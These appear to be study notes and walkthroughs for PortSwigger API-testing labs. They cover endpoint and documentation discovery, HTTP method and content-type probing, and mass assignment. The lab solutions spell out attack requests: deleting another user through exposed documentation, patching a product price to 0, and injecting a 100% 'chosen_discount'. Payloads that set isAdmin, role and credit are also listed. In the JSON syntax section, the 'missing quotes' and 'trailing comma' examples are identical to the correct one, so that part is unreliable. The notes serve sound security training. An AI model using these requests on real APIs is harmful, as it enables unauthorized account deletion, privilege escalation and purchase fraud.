# API Testing

## API Reconnaissance

API reconnaissance (recon) is the process of gathering information about an API to identify its attack surface before testing.

### Goals

- Identify API endpoints
- Understand how endpoints interact with resources
- Discover supported HTTP methods
- Identify required and optional parameters
- Determine authentication mechanisms
- Discover rate limits
- Locate API documentation

### Example Endpoint

Request:

```http
GET /api/books HTTP/1.1
Host: example.com
```

Endpoint:

```text
/api/books
```

Possible related endpoints:

```text
/api/books/mystery
/api/books/scifi
/api/books/123
```

---

## API Documentation

API documentation explains how an API should be used.

### Types

#### Human-Readable Documentation

Designed for developers.

Usually contains:

- Endpoint descriptions
- Request examples
- Response examples
- Authentication information
- Error handling

#### Machine-Readable Documentation

Designed for software tools.

Common formats:

- JSON
- YAML
- XML

Examples:

- OpenAPI Specification
- Swagger

Benefits for attackers:

- Quickly maps attack surface
- Reveals hidden endpoints
- Shows accepted parameters
- Shows authentication requirements

---

## Discovering API Documentation

### Common Documentation Locations

```text
/api
/swagger
/swagger/index.html
/openapi.json
/openapi.yaml
/docs
/api-docs
/redoc
```

### Methodology

If an endpoint is discovered:

```text
/api/swagger/v1/users/123
```

Work backwards:

```text
/api/swagger/v1
/api/swagger
/api
```

Documentation is often exposed somewhere higher in the path hierarchy.

---

## Recon Techniques

### 1. Browse the Application

Look for:

- Account management features
- Search functionality
- Mobile-app style requests
- AJAX requests

### 2. Burp HTTP History

Observe:

- Endpoints
- Parameters
- Authentication tokens
- HTTP methods

### 3. Burp Scanner Crawl

Can automatically discover:

- API endpoints
- OpenAPI specifications
- Swagger documentation

### 4. Intruder Path Discovery

Use wordlists containing:

```text
swagger
api
docs
openapi
v1
v2
```

to discover documentation endpoints.

---

## Useful Burp Workflow

1. Browse application
2. Capture API requests
3. Send requests to Repeater
4. Manipulate paths
5. Discover higher-level endpoints
6. Search for documentation
7. Use documentation to map attack surface
8. Test authorization and access controls

---

# Lab: Discovering API Documentation

## Objective

Find exposed API documentation and delete user `carlos`.

### Credentials

```text
Username: wiener
Password: peter
```

## Solution Summary

### Step 1

Login as:

```text
wiener:peter
```

### Step 2

Update email address.

Observe request:

```http
PATCH /api/user/wiener
```

### Step 3

Send request to Repeater.

### Step 4

Modify endpoint:

```http
PATCH /api/user
```

Result:

```text
Error - user identifier missing
```

### Step 5

Move one level higher:

```http
PATCH /api
```

Result:

```text
API documentation exposed
```

### Step 6

Open documentation in browser.

### Step 7

Use interactive documentation.

Find:

```http
DELETE /api/user/{username}
```

### Step 8

Send:

```http
DELETE /api/user/carlos
```

Lab solved.

---

# Lessons Learned

## 1. Always Investigate Parent Paths

If you discover:

```text
/api/user/wiener
```

Check:

```text
/api/user
/api
```

Documentation may be exposed at a higher level.

## 2. API Documentation Can Be a Security Risk

Exposed documentation may reveal:

- Hidden endpoints
- Administrative functions
- Accepted parameters
- HTTP methods
- Authentication details

## 3. Documentation Speeds Up Testing

Instead of brute-forcing endpoints, documentation can provide a complete map of the API.

## 4. Repeater Is Essential

Repeater allows:

- Endpoint enumeration
- Method testing
- Parameter manipulation
- Authorization testing

## 5. Always Check if the parameters are properly removed or add

According to the original request (PATCH here), there's a parameter called email included in the request. Just changing PATCH to DELETE /api/user/carlos didn't work. I needed to delete email:example@gmail.com from the original request in repeater too.

---

# Common API Documentation Frameworks

| Framework  | Typical Paths       |
| ---------- | ------------------- |
| Swagger UI | /swagger            |
| Swagger UI | /swagger/index.html |
| OpenAPI    | /openapi.json       |
| OpenAPI    | /openapi.yaml       |
| ReDoc      | /redoc              |
| API Docs   | /docs               |

# Identifying API Endpoints

API documentation is useful, but should never be fully trusted. Documentation may be:

- Incomplete
- Outdated
- Misconfigured
- Missing hidden functionality

Always perform manual reconnaissance in addition to reviewing documentation.

## Endpoint Discovery Techniques

### 1. Browse the Application

While using the web application, look for:

- API requests in Burp Proxy History
- AJAX requests
- Account management features
- Search functionality
- Product pages
- Mobile application traffic

Common API patterns:

```text
/api/
/v1/
/v2/
/rest/
/graphql
```

Example:

```http
GET /api/products/3/price HTTP/1.1
```

Potential related endpoints:

```text
/api/products
/api/products/3
/api/products/3/price
/api/products/3/reviews
```

---

### 2. Analyze JavaScript Files

JavaScript often contains references to API endpoints that have not yet been accessed.

Example:

```javascript
fetch("/api/users/current");
```

Useful findings:

- Hidden endpoints
- Internal APIs
- Debug functionality
- Administrative routes

Tools:

- Burp Scanner
- JS Link Finder BApp
- Manual JavaScript review

---

### 3. Observe API Patterns

After identifying one endpoint, look for similar structures.

Example:

```text
/api/user/update
```

Potential endpoints:

```text
/api/user/delete
/api/user/create
/api/user/add
/api/user/reset-password
```

Applications often use predictable naming conventions.

---

# Interacting with API Endpoints

After discovering endpoints, interact with them using:

- Burp Repeater
- Burp Intruder

Goals:

- Understand behavior
- Discover hidden functionality
- Trigger informative errors
- Identify access control weaknesses

Pay close attention to:

- Error messages
- Status codes
- Response headers
- Supported methods

Error responses frequently reveal implementation details.

---

# Identifying Supported HTTP Methods

HTTP methods determine what actions can be performed on resources.

Common methods:

| Method  | Purpose                  |
| ------- | ------------------------ |
| GET     | Retrieve data            |
| POST    | Create data              |
| PUT     | Replace data             |
| PATCH   | Modify data              |
| DELETE  | Remove data              |
| OPTIONS | Discover allowed methods |

---

## Example REST API

```http
GET /api/tasks
```

Returns:

```json
[
  {
    "id": 1,
    "task": "Buy milk"
  }
]
```

```http
POST /api/tasks
```

Creates a new task.

```http
DELETE /api/tasks/1
```

Deletes task 1.

---

## Using OPTIONS

OPTIONS is extremely useful during recon.

Example:

```http
OPTIONS /api/products/1/price
```

Response:

```http
Allow: GET, PATCH
```

This immediately reveals additional functionality.

### Recon Workflow

1. Discover endpoint
2. Send OPTIONS request
3. Record allowed methods
4. Test each method individually

---

## Testing Alternative Methods

If an endpoint uses:

```http
GET /api/products/1/price
```

Try:

```http
POST
PUT
PATCH
DELETE
OPTIONS
```

Additional functionality may exist but not be exposed through the UI.

---

# Identifying Supported Content Types

Many APIs expect data in a specific format.

The server behavior may change depending on the Content-Type header.

Common content types:

```http
application/json
```

```http
application/xml
```

```http
application/x-www-form-urlencoded
```

```http
multipart/form-data
```

---

## Why Content Types Matter

Changing content types can:

- Trigger verbose errors
- Reveal implementation details
- Bypass filters
- Reach alternative code paths
- Expose injection vulnerabilities

Example:

A JSON parser may be secure while an XML parser is vulnerable.

---

## Content-Type Testing Methodology

### Initial Request

```http
POST /api/user
Content-Type: application/json
```

Body:

```json
{
  "name": "wiener"
}
```

### Alternative Tests

```http
Content-Type: application/xml
```

```xml
<user>
    <name>wiener</name>
</user>
```

or

```http
Content-Type: application/x-www-form-urlencoded
```

```text
name=wiener
```

Observe any differences in:

- Status codes
- Error messages
- Application behavior

---

# Lab: Exploiting a Hidden API Endpoint

## Objective

Purchase the Lightweight "l33t" Leather Jacket by exploiting hidden API functionality.

Credentials:

```text
Username: wiener
Password: peter
```

---

## Discovery Process

### Step 1

Browse a product page.

Observe API request:

```http
GET /api/products/1/price
```

---

### Step 2

Send request to Repeater.

Test:

```http
OPTIONS /api/products/1/price
```

Response:

```http
Allow: GET, PATCH
```

Discovery:

- GET is exposed
- PATCH is hidden functionality

---

### Step 3

Test PATCH

```http
PATCH /api/products/1/price
```

Response:

```text
Unauthorized
```

This indicates:

- PATCH exists
- Authentication is required

---

### Step 4

Login

```text
wiener:peter
```

Repeat request.

---

### Step 5

Send PATCH request again.

Response:

```text
Unsupported Media Type
```

Error reveals:

```http
Content-Type: application/json
```

is required.

---

### Step 6

Add JSON body

```http
PATCH /api/products/1/price
Content-Type: application/json
```

Body:

```json
{}
```

Response:

```text
Missing parameter: price
```

Useful error message reveals required input.

---

### Step 7

Supply required parameter

```json
{
  "price": 0
}
```

Request succeeds.

---

### Step 8

Reload product page.

Price becomes:

```text
$0.00
```

Add product to basket and place order.

Lab solved.

---

# Lessons Learned

## 1. Error Messages Are Recon Tools

Errors can reveal:

- Required parameters
- Expected content types
- Authentication requirements
- Internal functionality

Example:

```text
Missing parameter: price
```

directly disclosed how to construct a valid request.

---

## 2. Always Test OPTIONS

OPTIONS frequently exposes:

```text
GET
POST
PUT
PATCH
DELETE
```

that are otherwise hidden.

---

## 3. Hidden Functionality Often Exists

The UI may only use:

```http
GET
```

while the API also supports:

```http
PATCH
DELETE
POST
```

Always test alternative methods.

---

## 4. Content-Type Manipulation Is Important

Different content types may:

- Trigger different parsers
- Expose vulnerabilities
- Bypass security controls

Never assume JSON is the only supported format.

---

# Using Intruder to Find Hidden Endpoints

Suppose you discover:

```http
PUT /api/user/update
```

Use Intruder to fuzz:

```text
update
```

with common API actions:

```text
delete
remove
create
add
register
reset-password
change-password
activate
deactivate
search
export
import
admin
```

Potential discoveries:

```http
PUT /api/user/delete
POST /api/user/add
POST /api/user/reset-password
```

---

# Request Formatting and Parsing

A request may fail even if the endpoint, HTTP method, and parameters are correct.

Before an API processes business logic, the web server and application framework must successfully parse the request.

As a result, incorrect formatting can trigger errors that reveal useful information about the API.

---

## Why Request Formatting Matters

Improper request formatting may cause:

- `400 Bad Request`
- `401 Unauthorized`
- `415 Unsupported Media Type`
- `422 Unprocessable Entity`
- JSON parsing errors
- XML parsing errors

These errors often reveal:

- Expected content types
- Required parameters
- Accepted request formats
- Internal framework behavior

---

## Request Parsing Layers

A request generally passes through several validation stages:

```text
1. HTTP Request Structure
2. Headers
3. Content-Type Validation
4. Request Body Parsing
5. Parameter Validation
6. Business Logic
```

Failure at any stage may generate useful error messages.

---

## Correct JSON Request Format

Example:

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "price": 0
}
```

Important:

- Valid HTTP method
- Valid endpoint
- Correct Content-Type
- Blank line between headers and body
- Valid JSON syntax

---

## Header and Body Separation

A blank line must exist between the HTTP headers and the request body.

Correct:

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "price": 0
}
```

Incorrect:

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
Content-Type: application/json
{
    "price": 0
}
```

Without the blank line, the server may interpret the JSON as part of the headers and reject the request.

---

## Content-Type Header

The Content-Type header tells the server how to interpret the request body.

Examples:

```http
Content-Type: application/json
```

```http
Content-Type: application/xml
```

```http
Content-Type: application/x-www-form-urlencoded
```

Sometimes additional parameters are included:

```http
Content-Type: application/json; charset=utf-8
```

The semicolon separates additional content-type parameters.

---

## JSON Syntax Validation

Correct:

```json
{
  "price": 0
}
```

Incorrect (missing quotes):

```json
{
  "price": 0
}
```

Incorrect (trailing comma):

```json
{
  "price": 0
}
```

Incorrect (invalid separator):

```json
{
    "price" = 0
}
```

These often trigger parsing errors before the application logic is reached.

---

## Error-Driven Reconnaissance

Example workflow:

### Request

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
```

### Response

```text
415 Unsupported Media Type
```

Discovery:

```http
Content-Type: application/json
```

is required.

---

### Request

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
Content-Type: application/json

{}
```

### Response

```text
Missing parameter: price
```

Discovery:

```json
{
  "price": 0
}
```

is required.

---

## API Testing Tip

When an API request fails, do not immediately assume that:

- Authentication is wrong
- Authorization is missing
- The endpoint is invalid

First verify:

- HTTP method
- Request path
- Headers
- Content-Type
- Header/body separation
- JSON/XML syntax
- Required parameters

Many PortSwigger labs intentionally rely on error messages to guide you toward constructing a valid request.

---

# Finding Hidden Parameters

During API reconnaissance, you may discover parameters that are not documented or visible in the application's user interface.

These hidden parameters may:

- Expose additional functionality
- Reveal internal object fields
- Enable privilege escalation
- Lead to Mass Assignment vulnerabilities

---

## Why Hidden Parameters Exist

Developers often expose only a subset of an object's fields through the user interface.

Example user profile:

```json
{
  "username": "wiener",
  "email": "wiener@example.com"
}
```

Actual backend object:

```json
{
  "id": 123,
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": false,
  "accountBalance": 500,
  "role": "user",
  "isVerified": true
}
```

Although the UI only displays username and email, the API may still process additional fields.

---

# Discovering Hidden Parameters

## 1. Burp Intruder

Use Intruder to add or replace parameters with common names.

Examples:

```text
id
role
admin
isAdmin
verified
price
discount
balance
permissions
accessLevel
```

Observe differences in:

- Response codes
- Response lengths
- Error messages
- Application behavior

---

## 2. Param Miner

Param Miner can automatically guess thousands of parameter names.

Benefits:

- Fast enumeration
- Context-aware guessing
- Useful for undocumented APIs

Can discover:

```text
isAdmin
debug
internal
accessLevel
role
```

that are not visible in normal requests.

---

## 3. Content Discovery

Content Discovery can identify:

- Hidden endpoints
- Hidden directories
- Hidden parameters

These may reveal additional API functionality.

---

# Mass Assignment Vulnerabilities

## Definition

Mass Assignment (Auto-Binding) occurs when a framework automatically maps user-supplied parameters directly onto an internal object.

Instead of explicitly selecting allowed fields, the application blindly updates any matching field names supplied by the user.

---

## Conceptual Example

Suppose the application contains this internal user object:

```json
{
  "id": 123,
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": false
}
```

The developer intends users to update only:

```json
{
  "username": "wiener",
  "email": "wiener@example.com"
}
```

However, the framework automatically maps all incoming parameters to the object.

The attacker sends:

```json
{
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": true
}
```

Result:

```json
{
  "id": 123,
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": true
}
```

The attacker becomes an administrator.

---

# Why Mass Assignment Happens

Developers often write code similar to:

```python
user.update(request.json)
```

or

```javascript
Object.assign(user, req.body);
```

or

```ruby
User.update(params)
```

Instead of explicitly selecting safe fields.

The framework automatically binds every matching parameter.

---

# Understanding Auto-Binding

Imagine a form:

```json
{
  "username": "wiener"
}
```

Backend object:

```json
{
  "username": "wiener",
  "role": "user",
  "isAdmin": false
}
```

Framework behavior:

```text
For every field in request:
    Find matching object field
    Copy value into object
```

This process is called:

```text
Auto-Binding
Object Mapping
Mass Assignment
```

The framework helps developers write less code but can introduce security vulnerabilities.

---

# Identifying Potential Mass Assignment

A common technique is comparing:

## Update Request

```http
PATCH /api/users/123
```

```json
{
  "username": "wiener",
  "email": "wiener@example.com"
}
```

---

## Object Retrieval

```http
GET /api/users/123
```

```json
{
  "id": 123,
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": false,
  "role": "user"
}
```

Potential hidden parameters:

```text
id
isAdmin
role
```

because they exist on the same object.

---

# Testing for Mass Assignment

## Step 1: Add Hidden Parameter

Original request:

```json
{
  "username": "wiener",
  "email": "wiener@example.com"
}
```

Modified request:

```json
{
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": false
}
```

Observe response.

---

## Step 2: Send Invalid Value

```json
{
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": "foo"
}
```

Possible response:

```text
Invalid boolean value
```

This is a strong indicator that:

- The parameter exists
- The application attempted to process it

---

## Step 3: Attempt Exploitation

```json
{
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": true
}
```

If accepted, privilege escalation may occur.

---

# Other Dangerous Hidden Fields

Mass Assignment is not limited to admin privileges.

Examples:

```json
{
  "role": "admin"
}
```

```json
{
  "accountBalance": 1000000
}
```

```json
{
  "discount": 100
}
```

```json
{
  "verified": true
}
```

```json
{
  "subscription": "premium"
}
```

```json
{
  "credit": 999999
}
```

Any sensitive field may become attacker-controlled.

---

# Real-World Example

E-commerce application:

Normal request:

```json
{
  "quantity": 1
}
```

Retrieved object:

```json
{
  "productId": 1,
  "quantity": 1,
  "price": 100,
  "discount": 0
}
```

Attacker sends:

```json
{
  "quantity": 1,
  "discount": 100
}
```

If the discount field is mass assignable, the item becomes free.

---

# Mass Assignment Recon Methodology

1. Find an update endpoint

```http
PATCH
PUT
POST
```

2. Find a retrieval endpoint

```http
GET
```

3. Compare request fields with returned object fields

4. Enumerate hidden fields

5. Add hidden fields to requests

6. Observe responses and validation errors

7. Attempt privilege escalation or business logic abuse

---

# Common Indicators

Look for:

- Large JSON objects returned by APIs
- Update endpoints with few visible fields
- Validation errors mentioning unknown fields
- Framework-generated error messages

Example:

```text
Unknown property: isAdmin
```

or

```text
Expected boolean value for isAdmin
```

These often indicate hidden parameters exist.

---

# Lab: Exploiting a Mass Assignment Vulnerability

## Objective

Purchase the Lightweight "l33t" Leather Jacket by exploiting a Mass Assignment vulnerability.

Credentials:

```text
Username: wiener
Password: peter
```

---

# Vulnerability Overview

This lab demonstrates a classic Mass Assignment vulnerability where a hidden object field can be supplied by the client even though it is not present in the original request.

The application trusts user-supplied values and automatically binds them to internal object fields.

---

# Reconnaissance

## Step 1: Add Product to Basket

Add the Lightweight "l33t" Leather Jacket to the shopping cart.

Attempt checkout.

Result:

```text
Insufficient credit
```

The item cannot be purchased normally.

---

## Step 2: Analyze Checkout Requests

Observe two API requests:

```http
GET /api/checkout
```

and

```http
POST /api/checkout
```

---

## Step 3: Compare Request and Response Objects

### POST Request

```json
{
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

### GET Response

```json
{
  "chosen_discount": {
    "percentage": 0
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

Observation:

The GET response contains an additional field:

```json
"chosen_discount"
```

that is not present in the POST request.

This is a strong indicator of a possible hidden parameter.

---

# Hidden Parameter Enumeration

When performing Mass Assignment testing, always compare:

```http
GET
```

responses against

```http
POST
PUT
PATCH
```

requests.

Fields that appear only in responses often belong to the internal object model and may still be writable.

---

# Testing the Hidden Parameter

## Original Request

```json
{
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

---

## Modified Request

```json
{
  "chosen_discount": {
    "percentage": 0
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

Response:

```text
Request accepted
```

Important observation:

The application did not reject the new parameter.

This suggests that the parameter is recognized and processed.

---

# Validation Testing

## Invalid Value Test

Send:

```json
{
  "chosen_discount": {
    "percentage": "x"
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

Response:

```text
Percentage must be a number
```

This is extremely valuable.

It proves:

- The parameter exists.
- The server processes it.
- Validation logic is applied.
- User input reaches backend code.

---

# Exploitation

Replace:

```json
{
  "chosen_discount": {
    "percentage": 0
  }
}
```

with:

```json
{
  "chosen_discount": {
    "percentage": 100
  }
}
```

Full request:

```json
{
  "chosen_discount": {
    "percentage": 100
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

Result:

```text
100% discount applied
```

Product price becomes:

```text
$0.00
```

Lab solved.

---

# Why This Vulnerability Exists

The application's internal checkout object likely resembles:

```json
{
  "chosen_discount": {
    "percentage": 0
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

Developers intended:

```text
chosen_discount
```

to be controlled by server-side business logic.

However, Mass Assignment caused user-supplied fields to be automatically bound to the internal object.

As a result:

```json
{
  "chosen_discount": {
    "percentage": 100
  }
}
```

overrides the server's intended value.

---

# Key Indicators Observed

## Hidden Field Appears in GET Response

```json
{
  "chosen_discount": {
    "percentage": 0
  }
}
```

This often indicates a writable internal field.

---

## Added Parameter Does Not Trigger Error

```json
{
  "chosen_discount": {
    "percentage": 0
  }
}
```

suggests the application recognizes the field.

---

## Invalid Value Generates Validation Error

```json
{
  "chosen_discount": {
    "percentage": "x"
  }
}
```

Error:

```text
Percentage must be a number
```

This is one of the strongest indicators of Mass Assignment.

The server is validating attacker-controlled input for an undocumented field.

---

# Recon Methodology Learned

When testing APIs:

### 1. Find Update Requests

```http
POST
PUT
PATCH
```

---

### 2. Find Related GET Requests

```http
GET
```

---

### 3. Compare Object Structures

Look for fields that appear only in responses.

Example:

```json
{
  "role": "user",
  "isAdmin": false,
  "discount": 0,
  "credit": 100
}
```

These are potential hidden parameters.

---

### 4. Add Hidden Fields

Example:

```json
{
  "discount": 0
}
```

---

### 5. Send Invalid Values

Example:

```json
{
  "discount": "abc"
}
```

Validation errors often confirm that the parameter is processed.

---

### 6. Attempt Business Logic Manipulation

Examples:

```json
{
  "discount": 100
}
```

```json
{
  "credit": 999999
}
```

```json
{
  "role": "admin"
}
```

```json
{
  "isAdmin": true
}
```

---

# Lessons Learned

1. Hidden parameters frequently appear in API responses.

2. GET responses often expose internal object structures.

3. Validation errors can confirm whether a hidden field is processed.

4. Mass Assignment occurs when user input is automatically bound to internal object fields.

5. Business logic values such as discounts, balances, roles, and permissions should never be trusted from client input.

6. A field does not need to be documented or visible in the UI to be exploitable.

---
